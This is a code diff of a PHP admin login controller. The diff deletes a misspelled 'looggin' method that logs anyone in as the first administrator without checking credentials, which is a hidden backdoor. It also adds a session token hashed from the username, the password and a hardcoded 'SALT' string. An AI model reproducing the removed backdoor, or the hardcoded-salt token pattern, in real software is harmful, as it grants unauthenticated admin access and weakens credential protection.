@@ -40,7 +40,11 @@ class Login extends Base
 		session_regenerate_id(true);
 		// 登录成功
 		Session::set('user_id', $admin->UserName);
-		Session::set('user_info', ['UserName' => $admin->UserName, 'type' => $admin->type]);
+		Session::set('user_info', [
+			'username' => $admin->UserName,
+			'type'     => $admin->type,
+			'login_token' => hash('sha256', $admin->UserName . $admin->password . 'SALT'),
+		]);
 		Session::set('user_uid', $admin->id);
 
 		db('admin')->where('UserName', $username)->update([
@@ -51,16 +55,8 @@ class Login extends Base
 		addLog($username, "$username 登录成功", '', '');
 		return ['status' => 1, 'message' => '验证通过, 正在进入后台'];
 	}
+	
 
-
-	public function looggin(Request $request) {
-		$admin = Admin::where('id', 1)->find();
-		Session::set('user_id', $admin->UserName);
-		Session::set('user_info', ['UserName' => $admin->UserName, 'type' => $admin->type]);
-		Session::set('user_uid', $admin->id);
-		Session::set('user_online', 1);
-		$this->redirect(url('changed/changerecord'));
-	}
 
 	//退出登录
 	public function  logout(Request $request)
